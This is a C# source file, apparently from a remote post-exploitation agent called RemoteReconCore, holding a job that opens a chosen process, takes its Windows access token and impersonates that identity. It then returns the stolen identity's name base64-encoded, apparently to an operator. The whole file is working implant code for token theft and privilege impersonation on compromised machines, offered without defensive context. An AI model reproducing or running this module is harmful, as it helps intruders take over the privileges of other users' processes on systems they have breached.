﻿using System;
using System.Collections.Generic;
using System.Security.Principal;
using System.Text;

// This command will open a process token to impersonate
namespace RemoteReconCore
{
    public class Impersonate : IJobs
    {
        private int targetPid;
        public bool InProgress;

        public Impersonate(int pid)
        {
            targetPid = pid;
        }

        
        public KeyValuePair<int, string> Run()
        {
            IntPtr hProcHandle = IntPtr.Zero;
            IntPtr hProcToken = IntPtr.Zero;

            if ((hProcHandle = WinApi.OpenProcess(WinApi.PROCESS_ALL_ACCESS, true, targetPid)) == IntPtr.Zero)
                if ((hProcHandle = WinApi.OpenProcess(WinApi.PROCESS_QUERY_INFORMATION, true, targetPid)) == IntPtr.Zero)
                    WinApi.CloseHandle(hProcHandle);

            if (!WinApi.OpenProcessToken(hProcHandle, WinApi.TOKEN_ALL_ACCESS, out hProcToken))
                WinApi.CloseHandle(hProcHandle);

            WindowsIdentity newId = new WindowsIdentity(hProcToken);

            try
            {
                Agent.context = newId.Impersonate();
                string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes(newId.Name));
                return new KeyValuePair<int, string>(0, msg);
            }
            catch (Exception e)
            {
                string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes(e.ToString()));
                return new KeyValuePair<int, string>(4, msg);
            }
        }
    }
}
